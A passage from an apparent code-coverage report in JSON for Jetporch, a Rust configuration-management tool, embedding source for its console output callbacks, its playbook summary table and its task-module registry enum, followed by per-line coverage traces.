0,\n            _ =\u003e 1\n        };\n    }\n    \n    pub fn on_before_transfer(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, path: \u0026String) {\n        let host2 = host.read().unwrap();\n        if context.read().unwrap().verbosity \u003e 0 {\n            println!(\"{color_blue}! {} =\u003e transferring to: {}\", host2.name, \u0026path.clone());\n        }\n    }\n\n    pub fn on_command_run(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, cmd: \u0026String) {\n        let host2 = host.read().unwrap();\n        if context.read().unwrap().verbosity \u003e 0 {\n            println!(\"{color_blue}! {} =\u003e exec: {}\", host2.name, \u0026cmd.clone());\n        }\n    }\n\n    pub fn on_command_ok(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, result: \u0026Arc\u003cOption\u003cCommandResult\u003e\u003e,) {\n        let host2 = host.read().unwrap();\n        let cmd_result = result.as_ref().as_ref().expect(\"missing command result\");\n        if context.read().unwrap().verbosity \u003e 2 {\n            let _ctx2 = context.write().unwrap(); // lock for multi-line output\n            println!(\"{color_blue}! {} ... command ok\", host2.name);\n            println!(\"    cmd: {}\", cmd_result.cmd);           \n            println!(\"    out: {}\", cmd_result.out.clone());\n            println!(\"    rc: {}{color_reset}\", cmd_result.rc);\n        }\n    }\n\n    pub fn on_command_failed(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, result: \u0026Arc\u003cOption\u003cCommandResult\u003e\u003e,) {\n        let host2 = host.read().expect(\"context read\");\n        let cmd_result = result.as_ref().as_ref().expect(\"missing command result\");\n        if context.read().unwrap().verbosity \u003e 2 {\n            let _ctx2 = context.write().unwrap(); // lock for multi-line output\n            println!(\"{color_red}! {} ... command failed\", host2.name);\n            println!(\"    cmd: {}\", cmd_result.cmd);\n            println!(\"    out: {}\", cmd_result.out.clone());\n            println!(\"    rc: {}{color_reset}\", cmd_result.rc);\n        }\n    }\n\n    pub fn show_playbook_summary(\u0026self, context: \u0026Arc\u003cRwLock\u003cPlaybookContext\u003e\u003e) {\n\n        let ctx = context.read().unwrap();\n\n        let seen_hosts = ctx.get_hosts_seen_count();\n        let role_ct = ctx.get_role_count();\n        let task_ct = ctx.get_task_count();\n        let action_ct = ctx.get_total_attempted_count();\n        let created_ct = ctx.get_total_creation_count();\n        let created_hosts = ctx.get_hosts_creation_count();\n        let modified_ct = ctx.get_total_modified_count();\n        let modified_hosts = ctx.get_hosts_modified_count();\n        let removed_ct = ctx.get_total_removal_count();\n        let removed_hosts = ctx.get_hosts_removal_count();\n        let executed_ct = ctx.get_total_executions_count();\n        let executed_hosts = ctx.get_hosts_executions_count();\n        let passive_ct = ctx.get_total_passive_count();\n        let passive_hosts = ctx.get_hosts_passive_count();\n        let matched_ct = ctx.get_total_matched_count();\n        let matched_hosts = ctx.get_hosts_matched_count();\n        let skipped_ct = ctx.get_total_skipped_count();\n        let skipped_hosts = ctx.get_hosts_skipped_count();\n        let adjusted_ct = ctx.get_total_adjusted_count();\n        let adjusted_hosts = ctx.get_hosts_adjusted_count();\n        let unchanged_hosts = seen_hosts - adjusted_hosts;\n        let unchanged_ct = action_ct - adjusted_ct;\n        let failed_ct    = ctx.get_total_failed_count();\n        let failed_hosts = ctx.get_hosts_failed_count();\n\n        let summary = match failed_hosts {\n            0 =\u003e match adjusted_hosts {\n                0 =\u003e String::from(format!(\"{color_green}(✓) Perfect. All hosts matched policy.{color_reset}\")),\n                _ =\u003e String::from(format!(\"{color_blue}(✓) Actions were applied.{color_reset}\")),\n            },\n            _ =\u003e String::from(format!(\"{color_red}(X) Failures have occured.{color_reset}\")),\n        };\n\n        let mode_table = format!(\"|:-|:-|:-|\\n\\\n                          | Results | Items | Hosts \\n\\\n                          | --- | --- | --- |\\n\\\n                          | Roles | {role_ct} | |\\n\\\n                          | Tasks | {task_ct} | {seen_hosts}|\\n\\\n                          | --- | --- | --- |\\n\\\n                          | Matched | {matched_ct} | {matched_hosts}\\n\\\n                          | Created | {created_ct} | {created_hosts}\\n\\\n                          | Modified | {modified_ct} | {modified_hosts}\\n\\\n                          | Removed | {removed_ct} | {removed_hosts}\\n\\\n                          | Executed | {executed_ct} | {executed_hosts}\\n\\\n                          | Passive | {passive_ct} | {passive_hosts}\\n\\\n                          | Skipped | {skipped_ct} | {skipped_hosts}\\n\\\n                          | --- | --- | ---\\n\\\n                          | Unchanged | {unchanged_ct} | {unchanged_hosts}\\n\\\n                          | Changed | {adjusted_ct} | {adjusted_hosts}\\n\\\n                          | Failed | {failed_ct} | {failed_hosts}\\n\\\n                          |-|-|-\");\n\n        crate::util::terminal::markdown_print(\u0026mode_table);\n        println!(\"{}\", format!(\"\\n{summary}\"));\n        println!(\"\");\n\n        let mut log_entry = self.log_entry(\u0026String::from(\"SUMMARY\"), Arc::clone(context));\n        let mut map : serde_json::map::Map\u003cString,serde_json::Value\u003e = serde_json::map::Map::new();\n        map.insert(String::from(\"matched_ct\"),      json!(matched_ct));\n        map.insert(String::from(\"matched_hosts\"),   json!(matched_hosts));\n        map.insert(String::from(\"created_ct\"),      json!(created_ct));\n        map.insert(String::from(\"created_hosts\"),   json!(created_hosts));\n        map.insert(String::from(\"modified_ct\"),     json!(modified_ct));\n        map.insert(String::from(\"modified_hosts\"),  json!(modified_hosts));\n        map.insert(String::from(\"executed_ct\"),     json!(executed_ct));\n        map.insert(String::from(\"executed_hosts\"),  json!(executed_hosts));\n        map.insert(String::from(\"passive_ct\"),      json!(passive_ct));\n        map.insert(String::from(\"passive_hosts\"),   json!(passive_hosts));\n        map.insert(String::from(\"skipped_ct\"),      json!(skipped_ct));\n        map.insert(String::from(\"skipped_hosts\"),   json!(skipped_hosts));\n        map.insert(String::from(\"unchanged_ct\"),    json!(unchanged_ct));\n        map.insert(String::from(\"unchanged_hosts\"), json!(unchanged_hosts));\n        map.insert(String::from(\"adjusted_ct\"),     json!(adjusted_ct));\n        map.insert(String::from(\"adjusted_hosts\"),  json!(adjusted_hosts));\n        map.insert(String::from(\"failed_ct\"),       json!(failed_ct));\n        map.insert(String::from(\"failed_hosts\"),    json!(failed_hosts));\n        log_entry.summary = Some(map.clone());\n        self.log(\u0026log_entry);\n\n    }\n\n}","traces":[{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":70,"address":[],"length":0,"stats":{"Line":0}},{"line":71,"address":[],"length":0,"stats":{"Line":0}},{"line":73,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":78,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":91,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":105,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":126,"address":[],"length":0,"stats":{"Line":0}},{"line":127,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":143,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":151,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":153,"address":[],"length":0,"stats":{"Line":0}},{"line":154,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":175,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":178,"address":[],"length":0,"stats":{"Line":0}},{"line":179,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":185,"address":[],"length":0,"stats":{"Line":0}},{"line":186,"address":[],"length":0,"stats":{"Line":0}},{"line":187,"address":[],"length":0,"stats":{"Line":0}},{"line":188,"address":[],"length":0,"stats":{"Line":0}},{"line":190,"address":[],"length":0,"stats":{"Line":0}},{"line":191,"address":[],"length":0,"stats":{"Line":0}},{"line":195,"address":[],"length":0,"stats":{"Line":0}},{"line":196,"address":[],"length":0,"stats":{"Line":0}},{"line":197,"address":[],"length":0,"stats":{"Line":0}},{"line":200,"address":[],"length":0,"stats":{"Line":0}},{"line":203,"address":[],"length":0,"stats":{"Line":0}},{"line":205,"address":[],"length":0,"stats":{"Line":0}},{"line":206,"address":[],"length":0,"stats":{"Line":0}},{"line":207,"address":[],"length":0,"stats":{"Line":0}},{"line":208,"address":[],"length":0,"stats":{"Line":0}},{"line":209,"address":[],"length":0,"stats":{"Line":0}},{"line":211,"address":[],"length":0,"stats":{"Line":0}},{"line":212,"address":[],"length":0,"stats":{"Line":0}},{"line":217,"address":[],"length":0,"stats":{"Line":0}},{"line":218,"address":[],"length":0,"stats":{"Line":0}},{"line":219,"address":[],"length":0,"stats":{"Line":0}},{"line":220,"address":[],"length":0,"stats":{"Line":0}},{"line":223,"address":[],"length":0,"stats":{"Line":0}},{"line":224,"address":[],"length":0,"stats":{"Line":0}},{"line":225,"address":[],"length":0,"stats":{"Line":0}},{"line":226,"address":[],"length":0,"stats":{"Line":0}},{"line":228,"address":[],"length":0,"stats":{"Line":0}},{"line":229,"address":[],"length":0,"stats":{"Line":0}},{"line":230,"address":[],"length":0,"stats":{"Line":0}},{"line":233,"address":[],"length":0,"stats":{"Line":0}},{"line":234,"address":[],"length":0,"stats":{"Line":0}},{"line":235,"address":[],"length":0,"stats":{"Line":0}},{"line":237,"address":[],"length":0,"stats":{"Line":0}},{"line":238,"address":[],"length":0,"stats":{"Line":0}},{"line":241,"address":[],"length":0,"stats":{"Line":0}},{"line":242,"address":[],"length":0,"stats":{"Line":0}},{"line":245,"address":[],"length":0,"stats":{"Line":0}},{"line":246,"address":[],"length":0,"stats":{"Line":0}},{"line":247,"address":[],"length":0,"stats":{"Line":0}},{"line":250,"address":[],"length":0,"stats":{"Line":0}},{"line":251,"address":[],"length":0,"stats":{"Line":0}},{"line":252,"address":[],"length":0,"stats":{"Line":0}},{"line":255,"address":[],"length":0,"stats":{"Line":0}},{"line":256,"address":[],"length":0,"stats":{"Line":0}},{"line":257,"address":[],"length":0,"stats":{"Line":0}},{"line":260,"address":[],"length":0,"stats":{"Line":0}},{"line":261,"address":[],"length":0,"stats":{"Line":0}},{"line":262,"address":[],"length":0,"stats":{"Line":0}},{"line":265,"address":[],"length":0,"stats":{"Line":0}},{"line":266,"address":[],"length":0,"stats":{"Line":0}},{"line":268,"address":[],"length":0,"stats":{"Line":0}},{"line":269,"address":[],"length":0,"stats":{"Line":0}},{"line":270,"address":[],"length":0,"stats":{"Line":0}},{"line":271,"address":[],"length":0,"stats":{"Line":0}},{"line":272,"address":[],"length":0,"stats":{"Line":0}},{"line":273,"address":[],"length":0,"stats":{"Line":0}},{"line":275,"address":[],"length":0,"stats":{"Line":0}},{"line":276,"address":[],"length":0,"stats":{"Line":0}},{"line":277,"address":[],"length":0,"stats":{"Line":0}},{"line":279,"address":[],"length":0,"stats":{"Line":0}},{"line":280,"address":[],"length":0,"stats":{"Line":0}},{"line":281,"address":[],"length":0,"stats":{"Line":0}},{"line":282,"address":[],"length":0,"stats":{"Line":0}},{"line":283,"address":[],"length":0,"stats":{"Line":0}},{"line":285,"address":[],"length":0,"stats":{"Line":0}},{"line":286,"address":[],"length":0,"stats":{"Line":0}},{"line":287,"address":[],"length":0,"stats":{"Line":0}},{"line":289,"address":[],"length":0,"stats":{"Line":0}},{"line":291,"address":[],"length":0,"stats":{"Line":0}},{"line":293,"address":[],"length":0,"stats":{"Line":0}},{"line":294,"address":[],"length":0,"stats":{"Line":0}},{"line":295,"address":[],"length":0,"stats":{"Line":0}},{"line":297,"address":[],"length":0,"stats":{"Line":0}},{"line":298,"address":[],"length":0,"stats":{"Line":0}},{"line":299,"address":[],"length":0,"stats":{"Line":0}},{"line":301,"address":[],"length":0,"stats":{"Line":0}},{"line":302,"address":[],"length":0,"stats":{"Line":0}},{"line":305,"address":[],"length":0,"stats":{"Line":0}},{"line":310,"address":[],"length":0,"stats":{"Line":0}},{"line":311,"address":[],"length":0,"stats":{"Line":0}},{"line":312,"address":[],"length":0,"stats":{"Line":0}},{"line":313,"address":[],"length":0,"stats":{"Line":0}},{"line":319,"address":[],"length":0,"stats":{"Line":0}},{"line":320,"address":[],"length":0,"stats":{"Line":0}},{"line":322,"address":[],"length":0,"stats":{"Line":0}},{"line":323,"address":[],"length":0,"stats":{"Line":0}},{"line":324,"address":[],"length":0,"stats":{"Line":0}},{"line":325,"address":[],"length":0,"stats":{"Line":0}},{"line":326,"address":[],"length":0,"stats":{"Line":0}},{"line":327,"address":[],"length":0,"stats":{"Line":0}},{"line":329,"address":[],"length":0,"stats":{"Line":0}},{"line":330,"address":[],"length":0,"stats":{"Line":0}},{"line":331,"address":[],"length":0,"stats":{"Line":0}},{"line":333,"address":[],"length":0,"stats":{"Line":0}},{"line":334,"address":[],"length":0,"stats":{"Line":0}},{"line":335,"address":[],"length":0,"stats":{"Line":0}},{"line":336,"address":[],"length":0,"stats":{"Line":0}},{"line":337,"address":[],"length":0,"stats":{"Line":0}},{"line":339,"address":[],"length":0,"stats":{"Line":0}},{"line":340,"address":[],"length":0,"stats":{"Line":0}},{"line":341,"address":[],"length":0,"stats":{"Line":0}},{"line":343,"address":[],"length":0,"stats":{"Line":0}},{"line":344,"address":[],"length":0,"stats":{"Line":0}},{"line":346,"address":[],"length":0,"stats":{"Line":0}},{"line":347,"address":[],"length":0,"stats":{"Line":0}},{"line":348,"address":[],"length":0,"stats":{"Line":0}},{"line":350,"address":[],"length":0,"stats":{"Line":0}},{"line":351,"address":[],"length":0,"stats":{"Line":0}},{"line":352,"address":[],"length":0,"stats":{"Line":0}},{"line":354,"address":[],"length":0,"stats":{"Line":0}},{"line":355,"address":[],"length":0,"stats":{"Line":0}},{"line":358,"address":[],"length":0,"stats":{"Line":0}},{"line":363,"address":[],"length":0,"stats":{"Line":0}},{"line":364,"address":[],"length":0,"stats":{"Line":0}},{"line":365,"address":[],"length":0,"stats":{"Line":0}},{"line":366,"address":[],"length":0,"stats":{"Line":0}},{"line":369,"address":[],"length":0,"stats":{"Line":0}},{"line":370,"address":[],"length":0,"stats":{"Line":0}},{"line":371,"address":[],"length":0,"stats":{"Line":0}},{"line":374,"address":[],"length":0,"stats":{"Line":0}},{"line":375,"address":[],"length":0,"stats":{"Line":0}},{"line":376,"address":[],"length":0,"stats":{"Line":0}},{"line":377,"address":[],"length":0,"stats":{"Line":0}},{"line":378,"address":[],"length":0,"stats":{"Line":0}},{"line":379,"address":[],"length":0,"stats":{"Line":0}},{"line":381,"address":[],"length":0,"stats":{"Line":0}},{"line":382,"address":[],"length":0,"stats":{"Line":0}},{"line":383,"address":[],"length":0,"stats":{"Line":0}},{"line":384,"address":[],"length":0,"stats":{"Line":0}},{"line":385,"address":[],"length":0,"stats":{"Line":0}},{"line":386,"address":[],"length":0,"stats":{"Line":0}},{"line":387,"address":[],"length":0,"stats":{"Line":0}},{"line":388,"address":[],"length":0,"stats":{"Line":0}},{"line":389,"address":[],"length":0,"stats":{"Line":0}},{"line":392,"address":[],"length":0,"stats":{"Line":0}},{"line":395,"address":[],"length":0,"stats":{"Line":0}},{"line":398,"address":[],"length":0,"stats":{"Line":0}},{"line":399,"address":[],"length":0,"stats":{"Line":0}},{"line":400,"address":[],"length":0,"stats":{"Line":0}},{"line":401,"address":[],"length":0,"stats":{"Line":0}},{"line":404,"address":[],"length":0,"stats":{"Line":0}},{"line":405,"address":[],"length":0,"stats":{"Line":0}},{"line":406,"address":[],"length":0,"stats":{"Line":0}},{"line":407,"address":[],"length":0,"stats":{"Line":0}},{"line":408,"address":[],"length":0,"stats":{"Line":0}},{"line":409,"address":[],"length":0,"stats":{"Line":0}},{"line":410,"address":[],"length":0,"stats":{"Line":0}},{"line":413,"address":[],"length":0,"stats":{"Line":0}},{"line":414,"address":[],"length":0,"stats":{"Line":0}},{"line":415,"address":[],"length":0,"stats":{"Line":0}},{"line":416,"address":[],"length":0,"stats":{"Line":0}},{"line":417,"address":[],"length":0,"stats":{"Line":0}},{"line":421,"address":[],"length":0,"stats":{"Line":0}},{"line":422,"address":[],"length":0,"stats":{"Line":0}},{"line":423,"address":[],"length":0,"stats":{"Line":0}},{"line":424,"address":[],"length":0,"stats":{"Line":0}},{"line":428,"address":[],"length":0,"stats":{"Line":0}},{"line":429,"address":[],"length":0,"stats":{"Line":0}},{"line":430,"address":[],"length":0,"stats":{"Line":0}},{"line":431,"address":[],"length":0,"stats":{"Line":0}},{"line":435,"address":[],"length":0,"stats":{"Line":0}},{"line":436,"address":[],"length":0,"stats":{"Line":0}},{"line":437,"address":[],"length":0,"stats":{"Line":0}},{"line":438,"address":[],"length":0,"stats":{"Line":0}},{"line":439,"address":[],"length":0,"stats":{"Line":0}},{"line":440,"address":[],"length":0,"stats":{"Line":0}},{"line":441,"address":[],"length":0,"stats":{"Line":0}},{"line":442,"address":[],"length":0,"stats":{"Line":0}},{"line":443,"address":[],"length":0,"stats":{"Line":0}},{"line":447,"address":[],"length":0,"stats":{"Line":0}},{"line":448,"address":[],"length":0,"stats":{"Line":0}},{"line":449,"address":[],"length":0,"stats":{"Line":0}},{"line":450,"address":[],"length":0,"stats":{"Line":0}},{"line":451,"address":[],"length":0,"stats":{"Line":0}},{"line":452,"address":[],"length":0,"stats":{"Line":0}},{"line":453,"address":[],"length":0,"stats":{"Line":0}},{"line":454,"address":[],"length":0,"stats":{"Line":0}},{"line":455,"address":[],"length":0,"stats":{"Line":0}},{"line":459,"address":[],"length":0,"stats":{"Line":0}},{"line":461,"address":[],"length":0,"stats":{"Line":0}},{"line":463,"address":[],"length":0,"stats":{"Line":0}},{"line":464,"address":[],"length":0,"stats":{"Line":0}},{"line":465,"address":[],"length":0,"stats":{"Line":0}},{"line":466,"address":[],"length":0,"stats":{"Line":0}},{"line":467,"address":[],"length":0,"stats":{"Line":0}},{"line":468,"address":[],"length":0,"stats":{"Line":0}},{"line":469,"address":[],"length":0,"stats":{"Line":0}},{"line":470,"address":[],"length":0,"stats":{"Line":0}},{"line":471,"address":[],"length":0,"stats":{"Line":0}},{"line":472,"address":[],"length":0,"stats":{"Line":0}},{"line":473,"address":[],"length":0,"stats":{"Line":0}},{"line":474,"address":[],"length":0,"stats":{"Line":0}},{"line":475,"address":[],"length":0,"stats":{"Line":0}},{"line":476,"address":[],"length":0,"stats":{"Line":0}},{"line":477,"address":[],"length":0,"stats":{"Line":0}},{"line":478,"address":[],"length":0,"stats":{"Line":0}},{"line":479,"address":[],"length":0,"stats":{"Line":0}},{"line":480,"address":[],"length":0,"stats":{"Line":0}},{"line":481,"address":[],"length":0,"stats":{"Line":0}},{"line":482,"address":[],"length":0,"stats":{"Line":0}},{"line":483,"address":[],"length":0,"stats":{"Line":0}},{"line":484,"address":[],"length":0,"stats":{"Line":0}},{"line":485,"address":[],"length":0,"stats":{"Line":0}},{"line":486,"address":[],"length":0,"stats":{"Line":0}},{"line":488,"address":[],"length":0,"stats":{"Line":0}},{"line":489,"address":[],"length":0,"stats":{"Line":0}},{"line":490,"address":[],"length":0,"stats":{"Line":0}},{"line":491,"address":[],"length":0,"stats":{"Line":0}},{"line":493,"address":[],"length":0,"stats":{"Line":0}},{"line":496,"address":[],"length":0,"stats":{"Line":0}},{"line":515,"address":[],"length":0,"stats":{"Line":0}},{"line":516,"address":[],"length":0,"stats":{"Line":0}},{"line":517,"address":[],"length":0,"stats":{"Line":0}},{"line":519,"address":[],"length":0,"stats":{"Line":0}},{"line":520,"address":[],"length":0,"stats":{"Line":0}},{"line":521,"address":[],"length":0,"stats":{"Line":0}},{"line":522,"address":[],"length":0,"stats":{"Line":0}},{"line":523,"address":[],"length":0,"stats":{"Line":0}},{"line":524,"address":[],"length":0,"stats":{"Line":0}},{"line":525,"address":[],"length":0,"stats":{"Line":0}},{"line":526,"address":[],"length":0,"stats":{"Line":0}},{"line":527,"address":[],"length":0,"stats":{"Line":0}},{"line":528,"address":[],"length":0,"stats":{"Line":0}},{"line":529,"address":[],"length":0,"stats":{"Line":0}},{"line":530,"address":[],"length":0,"stats":{"Line":0}},{"line":531,"address":[],"length":0,"stats":{"Line":0}},{"line":532,"address":[],"length":0,"stats":{"Line":0}},{"line":533,"address":[],"length":0,"stats":{"Line":0}},{"line":534,"address":[],"length":0,"stats":{"Line":0}},{"line":535,"address":[],"length":0,"stats":{"Line":0}},{"line":536,"address":[],"length":0,"stats":{"Line":0}},{"line":537,"address":[],"length":0,"stats":{"Line":0}},{"line":538,"address":[],"length":0,"stats":{"Line":0}},{"line":539,"address":[],"length":0,"stats":{"Line":0}},{"line":540,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":296},{"path":["/","Users","wings","projects","jetpack","src","registry","list.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse serde::Deserialize;\nuse crate::tasks::*;\nuse std::sync::Arc;\n\n// note: there is some repetition in this module that we would rather not have\n// however, it comes from a conflict between polymorphic dispatch macros + traits\n// and a lack of data-inheritance in structs. please ignore it the best you can \n// and this may be improved later. If there was no Enum, we could have\n// polymorphic dispatch, but traversal would lose a lot of serde benefits.\n\n// ADD NEW MODULES HERE, KEEP ALPHABETIZED BY SECTION\n\n// accessctl\nuse crate::modules::access::group::GroupTask;\nuse crate::modules::access::user::UserTask;\n\n// commands\nuse crate::modules::commands::external::ExternalTask;\nuse crate::modules::commands::shell::ShellTask;\n\n// control\nuse crate::modules::control::assert::AssertTask;\nuse crate::modules::control::debug::DebugTask;\nuse crate::modules::control::echo::EchoTask;\nuse crate::modules::control::fail::FailTask;\nuse crate::modules::control::facts::FactsTask;\nuse crate::modules::control::set::SetTask;\n\n// files\nuse crate::modules::files::copy::CopyTask;\nuse crate::modules::files::directory::DirectoryTask;\nuse crate::modules::files::file::FileTask;\nuse crate::modules::files::git::GitTask;\nuse crate::modules::files::stat::StatTask;\nuse crate::modules::files::template::TemplateTask;\n\n// packages\nuse crate::modules::packages::apt::AptTask;\nuse crate::modules::packages::homebrew::HomebrewTask;\nuse crate::modules::packages::pacman::PacmanTask;\nuse crate::modules::packages::yum_dnf::YumDnfTask;\nuse crate::modules::packages::zypper::ZypperTask;\n\n// services\nuse crate::modules::services::sd_service::SystemdServiceTask;\n\n#[allow(non_camel_case_types)]\n#[derive(Deserialize,Debug)]\n#[serde(rename_all=\"lowercase\")]\npub enum Task {\n    // ADD NEW MODULES HERE, KEEP ALPHABETIZED BY NAME\n    Apt(AptTask),\n    Assert(AssertTask),\n    Copy(CopyTask),\n    Debug(DebugTask),\n    Directory(DirectoryTask),\n    Dnf(YumDnfTask),\n    Echo(EchoTask),\n    External(ExternalTask),\n    Facts(FactsTask),\n    Fail(FailTask),\n    File(FileTask),\n    Git(GitTask),\n    Group(GroupTask),\n    Homebrew(HomebrewTask),\n    Pacman(PacmanTask),\n    Sd_Service(SystemdServiceTask),\n    Set(SetTask),\n    Shell(ShellTask),\n    Stat(StatTask),\n    Template(TemplateTask),\n    User(UserTask),\n    Yum(YumDnfTask),\n    Zypper(ZypperTask),\n}\n\nimpl Task {\n\n    pub fn get_module(\u0026self) -\u003e String {\n        // ADD NEW MODULES HERE, KEEP ALPHABETIZED BY NAME\n        return match self {\n            Task::Apt(x)        =\u003e x.get_module(),\n            Task::Assert(x)     =\u003e x.get_module(),\n            Task::Copy(x)       =\u003e x.get_module(),\n            Task::Debug(x)      =\u003e x.get_module(),\n            Task::Directory(x)  =\u003e x.get_module(),\n            Task::Dnf(x)        =\u003e x.get_module(),\n            Task::Echo(x)       =\u003e x.get_module(),\n            Task::External(x)   =\u003e x.get_module(),\n            Task::Facts(x)      =\u003e x.get_module(), \n            Task::Fail(x)       =\u003e x.get_module(), \n            Task::File(x)       =\u003e x.get_module(),\n            Task::Git(x)        =\u003e x.get_module(), \n            Task::Group(x)      =\u003e x.get_module(),\n            Task::Homebrew(x)   =\u003e x.get_module(),\n            Task::Pacman(x)     =\u003e x.get_module(),\n            Task::Sd_Service(x) =\u003e x.get_module(),\n            Task::Set(x)        =\u003e x.get_module(), \n            Task::Shell(x)      =\u003e x.get_module(), \n            Task::Stat(x)       =\u003e x.get_module(), \n            Task::Template(x)   =\u003e x.get_module(), \n            Task::User(x)       =\u003e x.get_module(),\n            Task::Yum(x)        =\u003e x.get_module(),\n            Task::Zypper(x)     =\u003e x.get_module(),\n        };\n    }\n\n    pub fn get_name(\u0026self) -\u003e Option\u003cString\u003e {\n        // ADD NEW MODULES HERE, KEEP ALPHABETIZED BY NAME\n        return match self {\n            Task::Apt(x)        =\u003e x.get_name(),\n            Task::Assert(x)     =\u003e x.get_name(),\n            Task::Copy(x)       =\u003e x.get_name(),\n            Task::Debug(x)      =\u003e x.get_name(), \n            Task::Directory(x)  =\u003e x.get_name(),\n            Task::Dnf(x)        =\u003e x.get_name(),\n            Task::Echo(x)       =\u003e x.get_name(),\n            Task::External(x)   =\u003e x.get_name(),\n            Task::Facts(x)      =\u003e x.get_name(),\n            Task::Fail(x)       =\u003e x.get_name(), \n            Task::File(x)       =\u003e x.get_name(), \n            Task::Git(x)        =\u003e x.get_name(),\n            Task::Group(x)      =\u003e x.get_name(),\n            Task::Homebrew(x)   =\u003e x.get_name(),\n            Task::Pacman(x)     =\u003e x.get_name(),\n            Task::Sd_Service(x) =\u003e x.get_name(),\n            Task::Set(x)        =\u003e x.get_name(),\n            Task::Shell(x)      =\u003e x.get_name(), \n            Task::Stat(x)       =\u003e x.get_name(),\n            Task::Template(x)   =\u003e x.get_name(), \n            Task::User(x)       =\u003e x.get_name(),\n            Task::Yum(x)        =\u003e x.get_name(),\n            Task::Zypper(x)     =\u003e x.get_name(),\n        };\n    }\n\n    pub fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e {\n        // ADD NEW MODULES HERE, KEEP ALPHABETIZED BY NAME\n        return match self {\n            Task::Apt(x)        =\u003e x.get_with(),\n            Task::Assert(x)     =\u003e x.get_with(),\n            Task::Copy(x)       =\u003e x.get_with(),\n            Task::Debug(x)      =\u003e x.get_with(), \n            Task::Directory(x)  =\u003e x.get_with(),\n            Task::Dnf(x)        =\u003e x.get_with(),\n            Task::Echo(x)       =\u003e x.get_with(),\n            Task::External(x)   =\u003e x.get_with(),\n            Task::Facts(x)      =\u003e x.get_with(),\n            Task::Fail(x)       =\u003e x.get_with(), \n            Task::File(x)       =\u003e x.get_with(),\n            Task::Git(x)        =\u003e x.get_with(), \n            Task::Group(x)      =\u003e x.get_with(),\n            Task::Homebrew(x)   =\u003e x.get_with(),\n            Task::Pacman(x)     =\u003e x.get_with(),\n            Task::Sd_Service(x) =\u003e x.get_with(),\n            Task::Set(x)        =\u003e x.get_with(),\n            Task::Shell(x)      =\u003e x.get_with(), \n            Task::Stat(x)       =\u003e x.get_with(), \n            Task::Template(x)   =\u003e x.get_with(),\n            Task::User(x)       =\u003e x.get_with(),\n            Task::Yum(x)        